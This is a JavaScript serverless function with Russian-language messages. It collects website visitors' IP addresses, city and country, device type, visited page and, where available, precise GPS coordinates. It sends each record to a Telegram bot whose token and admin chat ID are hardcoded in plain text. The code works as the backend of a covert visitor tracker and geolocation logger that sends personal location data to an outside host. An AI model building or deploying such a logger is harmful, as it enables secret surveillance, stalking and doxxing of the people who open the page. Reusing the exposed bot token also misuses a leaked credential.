const TELEGRAM_TOKEN = "8496981671:AAFL-4G4xFDUWj-eal5yJNiqIzxjIvqw2lo";
const ADMIN_ID = "7617539069";

exports.handler = async function(event, context) {
    console.log("🚀 Logger function called!");
    
    if (event.httpMethod !== 'POST') {
        console.log("❌ Not POST method");
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        console.log("✅ POST request received");
        const data = JSON.parse(event.body);
        console.log("📦 Data:", data);

        let device = '💻 ПК';
        const ua = data.userAgent || '';
        if (/mobile/i.test(ua)) device = '📱 Телефон';
        if (/tablet/i.test(ua)) device = '📟 Планшет';
        
        let message = `🔔 **НОВЫЙ ПОСЕТИТЕЛЬ!**\n`;
        message += `🕐 Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}\n`;
        message += `🌐 IP: ${data.ip || event.headers['client-ip'] || '?'}\n`;
        message += `📍 Гео: ${data.city || '?'}, ${data.country || '?'}\n`;
        message += `📱 Устройство: ${device}\n`;
        message += `🔗 Страница: ${data.addr || 'Не указан'}\n`;

        if (data.lat && data.lng) {
            message += `📍 **ТОЧНЫЕ КООРДИНАТЫ:**\n`;
            message += `🗺 Google: https://www.google.com/maps?q=${data.lat},${data.lng}\n`;
            message += `🎯 Погрешность: ${data.accuracy || '?'}м\n`;
        }

        console.log("📤 Sending to Telegram...");
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        console.log("✅ Telegram response:", result);

        return { 
            statusCode: 200, 
            body: JSON.stringify({ ok: true }) 
        };

    } catch (error) {
        console.error("❌ Error:", error);
        return { 
            statusCode: 500, 
            body: JSON.stringify({ error: error.message }) 
        };
    }
};
